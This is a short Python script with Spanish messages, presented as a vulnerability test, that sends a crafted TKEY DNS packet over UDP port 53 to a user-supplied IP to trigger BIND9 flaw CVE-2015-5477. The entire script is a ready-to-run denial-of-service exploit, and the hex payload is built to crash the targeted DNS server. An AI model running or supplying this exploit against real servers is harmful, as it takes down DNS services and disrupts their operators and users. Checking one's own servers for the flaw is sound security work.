#!/usr/bin/env python

import socket
import sys

print('Test vulnerabilidad TKEY DNS server BIND9 ')

if len(sys.argv) < 2:
        print('Uso: python ' + sys.argv[0] + ' [IP]')
        sys.exit(1)

print('Enviando paquete TKEY BIND9 Vulnerabilidad CVE-2015-5477 a la IP ' + sys.argv[1] + ' ...')

payload = bytearray('4d 55 01 00 00 01 00 00 00 00 00 01 03 41 41 41 03 41 41 41 00 00 f9 00 ff 03 41 41 41 03 41 41 41 00 00                  0a 00 ff 00 00 00 00 00 09 08 41 41 41 41 41 41 41 41'.replace(' ', '').decode('hex'))

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(payload, (sys.argv[1], 53))

print('Hecho.')
